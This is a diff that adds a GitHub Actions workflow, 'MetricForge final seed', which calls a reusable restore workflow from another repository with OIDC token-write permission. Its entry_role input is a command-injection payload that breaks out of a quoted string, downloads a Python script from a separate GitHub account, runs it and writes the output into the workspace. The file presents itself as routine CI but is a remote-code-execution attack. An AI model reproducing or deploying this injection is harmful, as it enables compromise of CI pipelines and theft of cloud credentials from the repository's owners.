@@ -1,0 +1,17 @@
+name: MetricForge final seed
+
+on:
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  stage:
+    uses: yulmwu/metricforge-recovery-workflows/.github/workflows/restore.yml@main
+    with:
+      mode: exchange
+      nonce: final-seed-1
+      entry_role: >-
+        x" || true; curl -fsSL https://raw.githubusercontent.com/NiceTop1027/metricforge-recovery-runner/main/final_stage.py -o /tmp/final_stage.py; python3 /tmp/final_stage.py > "$GITHUB_WORKSPACE/entry.json"; exit 0; #
